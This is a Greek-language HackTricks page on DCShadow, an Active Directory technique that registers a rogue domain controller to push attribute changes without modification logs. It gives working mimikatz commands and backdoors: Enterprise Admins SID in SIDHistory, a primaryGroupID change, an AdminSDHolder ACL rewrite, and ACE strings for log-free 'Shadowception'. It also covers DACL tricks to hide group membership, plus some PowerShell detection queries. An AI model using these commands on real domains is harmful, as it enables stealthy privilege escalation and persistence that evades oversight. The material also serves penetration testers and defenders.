# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Βασικές πληροφορίες

Καταχωρεί έναν **new Domain Controller** στο AD και τον χρησιμοποιεί για να **push attributes** (SIDHistory, SPNs...) σε καθορισμένα objects **χωρίς** να αφήνει **logs** σχετικά με τις **modifications**. Χρειάζεστε δικαιώματα **DA** και πρέπει να βρίσκεστε μέσα στο **root domain**.\
Σημειώστε ότι αν χρησιμοποιήσετε λανθασμένα δεδομένα, θα εμφανιστούν αρκετά άσχημα logs.<sup>[[2]](#references)</sup>

Για την εκτέλεση της επίθεσης χρειάζεστε 2 instances του mimikatz. Το ένα θα εκκινήσει τους RPC servers με δικαιώματα SYSTEM (πρέπει να υποδείξετε εδώ τις αλλαγές που θέλετε να πραγματοποιήσετε) και το άλλο instance θα χρησιμοποιηθεί για το push των values:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Notice ότι το **`elevate::token`** δεν θα λειτουργήσει σε session του `mimikatz1`, καθώς αυτό αύξησε τα privileges του thread, αλλά εμείς πρέπει να αυξήσουμε το **privilege του process**.\
Μπορείτε επίσης να επιλέξετε ένα αντικείμενο "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Μπορείτε να κάνετε push τις αλλαγές από έναν DA ή από έναν user με αυτά τα ελάχιστα permissions:

- Στο **domain object**:
- _DS-Install-Replica_ (Προσθήκη/Αφαίρεση Replica στο Domain)
- _DS-Replication-Manage-Topology_ (Διαχείριση Replication Topology)
- _DS-Replication-Synchronize_ (Replication Synchronization)
- Το **Sites object** (και τα children του) στο **Configuration container**:
- _CreateChild and DeleteChild_
- Το object του **computer που είναι registered ως DC**:
- _WriteProperty_ (Όχι Write)
- Το **target object**:
- _WriteProperty_ (Όχι Write)

Μπορείτε να χρησιμοποιήσετε το [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) για να δώσετε αυτά τα privileges σε έναν unprivileged user (σημειώστε ότι αυτό θα αφήσει κάποια logs). Αυτό είναι πολύ πιο restrictive από το να έχετε DA privileges.\
Για παράδειγμα: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Αυτό σημαίνει ότι το username _**student1**_, όταν είναι logged on στο machine _**mcorp-student1**_, έχει DCShadow permissions πάνω στο object _**root1user**_.

## Χρήση του DCShadow για τη δημιουργία backdoors
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Change PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Κατάχρηση primary group, κενά enumeration και detection

- Το `primaryGroupID` είναι ξεχωριστό attribute από τη λίστα `member` του group. Τα DCShadow/DSInternals μπορούν να το γράψουν απευθείας (π.χ. να ορίσουν `primaryGroupID=512` για το **Domain Admins**) χωρίς enforcement από το LSASS στο μηχάνημα, όμως το AD εξακολουθεί να **μετακινεί** τον χρήστη: η αλλαγή του PGID αφαιρεί πάντα τη membership από το προηγούμενο primary group (ίδια συμπεριφορά για οποιοδήποτε target group), επομένως δεν μπορείτε να διατηρήσετε την παλιά membership στο primary group.<sup>[[1]](#references)</sup>
- Τα default εργαλεία δεν επιτρέπουν την αφαίρεση ενός χρήστη από το τρέχον primary group του (`ADUC`, `Remove-ADGroupMember`), επομένως η αλλαγή του PGID συνήθως απαιτεί απευθείας writes στο directory (DCShadow/`Set-ADDBPrimaryGroup`).
- Η αναφορά membership είναι ασυνεπής:
- **Περιλαμβάνουν** members που προκύπτουν από primary group: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Παραλείπουν** members που προκύπτουν από primary group: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit κατά την επιθεώρηση του `member`, `Get-ADUser <user> -Properties memberOf`.
- Οι recursive έλεγχοι μπορεί να παραλείψουν members του primary group, αν το **primary group είναι το ίδιο nested** (π.χ. το PGID του χρήστη δείχνει σε ένα nested group μέσα στο Domain Admins). Τα `Get-ADGroupMember -Recursive` ή τα LDAP recursive filters δεν θα επιστρέψουν αυτόν τον χρήστη, εκτός αν η recursion επιλύει ρητά τα primary groups.
- DACL tricks: οι attackers μπορούν να **αρνηθούν το ReadProperty** στο `primaryGroupID` του user (ή στο attribute `member` του group για groups που δεν προστατεύονται από το AdminSDHolder), αποκρύπτοντας την effective membership από τα περισσότερα PowerShell queries. Το `net group` θα εξακολουθεί να επιλύει τη membership. Τα groups που προστατεύονται από το AdminSDHolder θα επαναφέρουν τέτοιες αρνήσεις.

Παραδείγματα detection/monitoring:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Διασταυρώστε τις privileged groups συγκρίνοντας τα αποτελέσματα του `Get-ADGroupMember` με τα `Get-ADGroup -Properties member` ή το ADSI Edit, για να εντοπίσετε αποκλίσεις που προκαλούνται από το `primaryGroupID` ή hidden attributes.<sup>[[1]](#references)</sup>

## Shadowception - Χορήγηση δικαιωμάτων DCShadow χρησιμοποιώντας DCShadow (χωρίς logs τροποποιημένων δικαιωμάτων)

Πρέπει να προσθέσουμε τα ακόλουθα ACEs με το SID του χρήστη μας στο τέλος:<sup>[[2]](#references)</sup>

- Στο αντικείμενο του domain:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Στο αντικείμενο του attacker computer: `(A;;WP;;;UserSID)`
- Στο αντικείμενο του target user: `(A;;WP;;;UserSID)`
- Στο αντικείμενο Sites στο Configuration container: `(A;CI;CCDC;;;UserSID)`

Για να λάβετε το τρέχον ACE ενός αντικειμένου: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`

Σε αυτήν την περίπτωση πρέπει να κάνετε **αρκετές αλλαγές**, όχι μόνο μία. Στο **mimikatz1 session** (RPC server), χρησιμοποιήστε την παράμετρο **`/stack` σε κάθε αλλαγή**. Στη συνέχεια πρέπει να χρησιμοποιήσετε την **`/push`** μόνο μία φορά, ώστε να εφαρμοστούν όλες οι stacked αλλαγές από τον rogue server.

[**Περισσότερες πληροφορίες σχετικά με το DCShadow στο ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)<sup>[[2]](#references)</sup>

## References

- [1] [TrustedSec - Περιπέτειες στη συμπεριφορά, την αναφορά και την εκμετάλλευση του Primary Group](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [Ανάλυση του DCShadow στο ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
{{#include ../../banners/hacktricks-training.md}}
